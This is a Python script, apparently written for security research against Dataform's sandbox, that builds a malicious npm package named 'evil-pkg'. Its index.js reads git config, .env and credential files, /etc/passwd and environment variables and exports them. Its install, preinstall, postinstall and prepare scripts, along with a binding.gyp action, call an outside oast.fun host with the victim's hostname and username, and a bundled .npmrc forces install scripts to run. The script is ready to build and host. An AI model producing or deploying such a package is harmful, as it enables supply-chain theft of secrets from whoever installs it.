#!/usr/bin/env python3
"""
Creates a malicious npm tarball that exfiltrates data when require()'d.

The package will:
1. Read sensitive files via restricted_fs (if available)
2. Export stolen data as module exports
3. Data gets included in BigQuery output via SQLX

Usage:
    python3 create_evil_tarball.py
    # Then host evil-package.tgz on your server
"""

import tarfile
import io
import json
import os

PACKAGE_NAME = "evil-pkg"
VERSION = "1.0.0"

# Malicious index.js - runs when require()'d
INDEX_JS = '''
// Evil package - exfiltrates data when require()'d
// Runs in Dataform's V8 sandbox

const exfilData = {
    timestamp: new Date().toISOString(),
    stolen: {}
};

// Try to access restricted_fs if available globally
try {
    if (typeof restricted_fs !== 'undefined') {
        // Read .git/config
        try {
            exfilData.stolen.git_config = restricted_fs.readFile('.git/config');
        } catch(e) {
            exfilData.stolen.git_config_error = e.message;
        }

        // Read package.json
        try {
            exfilData.stolen.package_json = restricted_fs.readFile('package.json');
        } catch(e) {}

        // Read dataform.json
        try {
            exfilData.stolen.dataform_json = restricted_fs.readFile('dataform.json');
        } catch(e) {}

        // Read workflow_settings.yaml
        try {
            exfilData.stolen.workflow_settings = restricted_fs.readFile('workflow_settings.yaml');
        } catch(e) {}

        // Try to enumerate definitions
        try {
            const files = [];
            const checkPaths = [
                'definitions',
                'includes',
                'node_modules/@dataform/core/package.json'
            ];
            for (const p of checkPaths) {
                try {
                    if (restricted_fs.exists(p)) {
                        if (restricted_fs.isDirectory(p)) {
                            files.push(p + '/');
                        } else {
                            files.push(p);
                        }
                    }
                } catch(e) {}
            }
            exfilData.stolen.files = files;
        } catch(e) {}

        // Try sensitive paths (will likely fail but worth trying)
        const sensitivePaths = [
            '/proc/self/environ',
            '/etc/passwd',
            '../../../etc/passwd',
            '.env',
            '.env.local',
            'secrets.json',
            'credentials.json'
        ];

        for (const p of sensitivePaths) {
            try {
                if (restricted_fs.exists(p)) {
                    exfilData.stolen['file_' + p.replace(/[^a-z0-9]/gi, '_')] =
                        restricted_fs.readFile(p).substring(0, 500);
                }
            } catch(e) {}
        }
    }
} catch(e) {
    exfilData.error = e.message;
}

// Try to access process.env
try {
    if (typeof process !== 'undefined' && process.env) {
        exfilData.stolen.env = {};
        for (const key in process.env) {
            exfilData.stolen.env[key] = String(process.env[key]).substring(0, 100);
        }
    }
} catch(e) {}

// Try to get global object keys
try {
    exfilData.stolen.globalKeys = Object.keys(globalThis).slice(0, 50);
} catch(e) {}

// Export the stolen data
module.exports = exfilData;
module.exports.getData = function() { return exfilData; };
module.exports.getJSON = function() { return JSON.stringify(exfilData); };
'''

# OAST domain for callback detection
OAST_DOMAIN = "juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun"

# Preinstall script - runs BEFORE package extraction (shell command)
PREINSTALL_SCRIPT = f'''
curl -s "https://{OAST_DOMAIN}/npm-preinstall-$(hostname)-$(whoami)" || wget -q -O- "https://{OAST_DOMAIN}/npm-preinstall-$(hostname)-$(whoami)" || true
'''

# Postinstall script - runs AFTER package installation (shell command)
POSTINSTALL_SCRIPT = f'''
curl -s "https://{OAST_DOMAIN}/npm-postinstall-$(hostname)-$(whoami)" || wget -q -O- "https://{OAST_DOMAIN}/npm-postinstall-$(hostname)-$(whoami)" || true
'''

# Install script - runs during installation
INSTALL_SCRIPT = f'''
curl -s "https://{OAST_DOMAIN}/npm-install-$(hostname)-$(whoami)" || wget -q -O- "https://{OAST_DOMAIN}/npm-install-$(hostname)-$(whoami)" || true
'''

# Package.json for the evil package - NOW WITH LIFECYCLE SCRIPTS
PACKAGE_JSON = {
    "name": PACKAGE_NAME,
    "version": VERSION,
    "description": "Totally legitimate package",
    "main": "index.js",
    "scripts": {
        "preinstall": PREINSTALL_SCRIPT.strip(),
        "install": INSTALL_SCRIPT.strip(),
        "postinstall": POSTINSTALL_SCRIPT.strip(),
        "prepare": f'curl -s "https://{OAST_DOMAIN}/npm-prepare" || true',
        "prepublish": f'curl -s "https://{OAST_DOMAIN}/npm-prepublish" || true'
    },
    "author": "security-researcher",
    "license": "MIT"
}

# binding.gyp - triggers node-gyp which may run even with --ignore-scripts
BINDING_GYP = f'''{{
  "targets": [
    {{
      "target_name": "exfil",
      "actions": [
        {{
          "action_name": "exfil_action",
          "inputs": [],
          "outputs": ["build/exfil.node"],
          "action": ["curl", "-s", "https://{OAST_DOMAIN}/node-gyp-action-$(hostname)-$(whoami)"]
        }}
      ]
    }}
  ]
}}
'''

# .npmrc inside package - might override global settings
PACKAGE_NPMRC = f'''
ignore-scripts=false
foreground-scripts=true
'''

def create_tarball(output_path="evil-package.tgz"):
    """Create a valid npm tarball."""

    # Create in-memory tarball
    tar_buffer = io.BytesIO()

    with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
        # Add package.json
        package_json_bytes = json.dumps(PACKAGE_JSON, indent=2).encode('utf-8')
        package_json_info = tarfile.TarInfo(name='package/package.json')
        package_json_info.size = len(package_json_bytes)
        tar.addfile(package_json_info, io.BytesIO(package_json_bytes))

        # Add index.js
        index_js_bytes = INDEX_JS.encode('utf-8')
        index_js_info = tarfile.TarInfo(name='package/index.js')
        index_js_info.size = len(index_js_bytes)
        tar.addfile(index_js_info, io.BytesIO(index_js_bytes))

        # Add binding.gyp (node-gyp trigger)
        binding_gyp_bytes = BINDING_GYP.encode('utf-8')
        binding_gyp_info = tarfile.TarInfo(name='package/binding.gyp')
        binding_gyp_info.size = len(binding_gyp_bytes)
        tar.addfile(binding_gyp_info, io.BytesIO(binding_gyp_bytes))

        # Add .npmrc inside package
        npmrc_bytes = PACKAGE_NPMRC.encode('utf-8')
        npmrc_info = tarfile.TarInfo(name='package/.npmrc')
        npmrc_info.size = len(npmrc_bytes)
        tar.addfile(npmrc_info, io.BytesIO(npmrc_bytes))

    # Write to file
    with open(output_path, 'wb') as f:
        f.write(tar_buffer.getvalue())

    print(f"[+] Created {output_path} ({len(tar_buffer.getvalue())} bytes)")
    print(f"[+] Package: {PACKAGE_NAME}@{VERSION}")
    print(f"[+] Host this file and update package.json with the URL")

    return output_path

if __name__ == "__main__":
    create_tarball()
